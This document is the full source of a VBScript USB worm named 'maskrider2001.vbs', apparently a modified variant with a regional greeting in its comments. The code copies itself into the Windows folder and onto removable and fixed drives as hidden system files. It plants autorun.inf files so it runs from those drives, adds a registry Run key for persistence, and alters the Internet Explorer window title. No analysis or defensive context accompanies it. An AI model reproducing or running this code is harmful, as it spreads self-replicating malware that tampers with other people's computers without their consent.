'THIS IS A MODIFIED VERSION BY: Nicklaus S. Buñag
'MABUHAY ESTI MARINDUQUE!
on error resume next
dim mysource,winpath,flashdrive,fs,mf,atr,tf,rg,nt,check,sd
atr = "[autorun]"&vbcrlf&"shellexecute=wscript.exe maskrider2001.vbs"
set fs = createobject("Scripting.FileSystemObject")
set mf = fs.getfile(Wscript.ScriptFullname)
dim text,size
size = mf.size
check = mf.drive.drivetype
set text=mf.openastextstream(1,-2)
do while not text.atendofstream
mysource=mysource&text.readline
mysource=mysource & vbcrlf
loop
do
Set winpath = fs.getspecialfolder(0)
set tf = fs.getfile(winpath & "\maskrider2001.vbs")
tf.attributes = 32
set tf=fs.createtextfile(winpath & "\maskrider2001.vbs",2,true)
tf.write mysource
tf.close
set tf = fs.getfile(winpath & "\maskrider2001.vbs")
tf.attributes = 39
for each flashdrive in fs.drives
If (flashdrive.drivetype = 1 or flashdrive.drivetype = 2) and flashdrive.path <> "A:" then
set tf=fs.getfile(flashdrive.path &"\maskrider2001.vbs")
tf.attributes =32
set tf=fs.createtextfile(flashdrive.path &"\maskrider2001.vbs",2,true)
tf.write mysource
tf.close
set tf=fs.getfile(flashdrive.path &"\maskrider2001.vbs")
tf.attributes =39
set tf =fs.getfile(flashdrive.path &"\autorun.inf")
tf.attributes = 32
set tf=fs.createtextfile(flashdrive.path &"\autorun.inf",2,true)
tf.write atr
tf.close
set tf =fs.getfile(flashdrive.path &"\autorun.inf")
tf.attributes=39
end if
next
set rg = createobject("WScript.Shell")
rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\maskrider",winpath&"\maskrider2001.vbs"
rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title","TAGA ESTI, MARINDUQUE MABUHAY!!!"
if check <> 1 then
Wscript.sleep 200000
end if
loop while check<>1
set sd = createobject("Wscript.shell")
sd.run winpath&"\explorer.exe /e,/select, "&Wscript.ScriptFullname
